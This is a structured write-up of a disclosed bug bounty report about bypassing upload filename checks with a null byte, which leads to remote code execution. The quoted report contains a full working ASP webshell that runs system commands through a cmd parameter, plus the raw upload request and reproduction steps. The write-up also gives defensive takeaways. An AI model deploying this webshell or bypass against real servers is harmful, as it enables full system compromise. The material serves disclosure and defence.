# Remote Code Execution via Null Byte File Extension Bypass in File Upload

## Metadata
- **Source:** HackerOne
- **Report:** 2054184 | https://hackerone.com/reports/2054184
- **Submitted:** 2023-07-06
- **Reporter:** pizzapower
- **Program:** HackerOne (Undisclosed Organization)
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Arbitrary File Upload, Null Byte Injection, Remote Code Execution, Insufficient File Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
An attacker can bypass file extension validation by inserting a null byte between extensions (e.g., poc.asp\x00.png), allowing upload of executable ASP files that are treated as images by the validation logic. The uploaded ASP webshell can then be accessed and executed on the server, providing complete remote code execution with system-level privileges.

## Attack scenario
1. Attacker identifies file upload functionality across multiple accessible repositories on the target domain
2. Attacker crafts a malicious ASP webshell containing WScript.Shell objects for command execution
3. Attacker constructs multipart form request with filename 'poc.asp\x00.png' to bypass extension whitelist validation
4. Attacker submits the request; server's validation checks only the .png extension while backend stores as poc.asp
5. Attacker accesses the uploaded file at /savefiles/poc.asp and receives rendered ASP output
6. Attacker executes arbitrary system commands through the webshell's cmd parameter, achieving full RCE

## Root cause
The file upload validation mechanism only checks the final file extension (.png) while the null byte causes string truncation in some backend processing, allowing the actual saved filename to be poc.asp. The server fails to properly sanitize null bytes in filenames and does not validate the actual file content or restrict execution of dangerous MIME types in the upload directory.

## Attacker mindset
An opportunistic attacker performing reconnaissance via fuzzing to discover hidden file upload endpoints. Once discovered, the attacker leverages known null byte injection techniques against weak validation, immediately escalating to RCE via webshell deployment. This represents a systematic approach to identifying and exploiting common upload vulnerabilities.

## Defensive takeaways
- Implement strict whitelist validation on actual file content (magic bytes/MIME type) rather than relying on extensions
- Sanitize all user-supplied filenames by removing null bytes, special characters, and path traversal sequences
- Store uploaded files outside the web root or in a directory with execution disabled (e.g., disable ASP execution via web.config)
- Use Content-Disposition: attachment headers and prevent direct execution of uploaded files
- Implement randomized filename generation server-side, discarding user-provided names entirely
- Validate file uploads against a strict Content-Type whitelist and verify magic bytes match declared type
- Apply principle of least privilege to file upload directories; remove execute permissions
- Log and monitor all file uploads for suspicious patterns and failed validation attempts
- Conduct regular security audits of all file upload endpoints, including hidden or undocumented ones

## Variant hunting
Search for similar null byte bypass patterns in other file upload implementations; test double extension attacks (poc.php.jpg), alternative null byte encodings (\x00, URL-encoded %00), MIME type confusion attacks, and combined traversal + null byte payloads. Check for XXE in file processors and race conditions between validation and storage.

## MITRE ATT&CK
- T1190
- T1433
- T1567
- T1608.004
- T1200

## Notes
The writeup demonstrates a classic null byte injection vulnerability that was particularly common in legacy systems and PHP/ASP applications. The vulnerability is straightforward to exploit but represents a critical security failure. The attacker discovered multiple upload endpoints via fuzzing, suggesting incomplete security assessment during development. The exposed webshell payload demonstrates immediate system reconnaissance capabilities (ComputerName, UserName, server details) before escalating to arbitrary command execution via cmd parameter.

## Full report
<details><summary>Expand</summary>

Hi,

I found "repos" at `https://███/` and `https://c█████████/` and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) `https://███████`.  There may be more, I had to fuzz a lot to find these. 

These repos contain file upload functionality. I found that if you place a null byte between file extensions, you can upload files with malicious extensions. 

Running the `dir` command at the uploaded file `https://████████/savefiles/poc.asp?cmd=dir`  - the shell has been deleted for security purposes. Let me know if you want me to reupload it. 

██████████

The request from burp - note the null byte: 

█████



*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████████/savefiles/poc.asp` and run commands. 


## Impact

Everything could be compromised.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Here is the actual request, but I'm not sure how well the null byte will translate. 

```
POST /repo/orbital/repo.asp?fileToUpload=pizza.asp HTTP/1.1
Host: ███
Cookie: ASPSESSIONIDCCSBDDQT=CAJLLPMCPOBLODENMGDGMADC
Content-Length: 1306
Sec-Ch-Ua: 
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7RcvHwqSCmAtKCIB
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Sec-Ch-Ua-Platform: ""
Origin: https://███████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://████████/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary7RcvHwqSCmAtKCIB
Content-Disposition: form-data; name="myfile"; filename="poc.asp.png"


<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>



------WebKitFormBoundary7RcvHwqSCmAtKCIB--

```

*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████/savefiles/poc.asp` and run commands.

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-12*
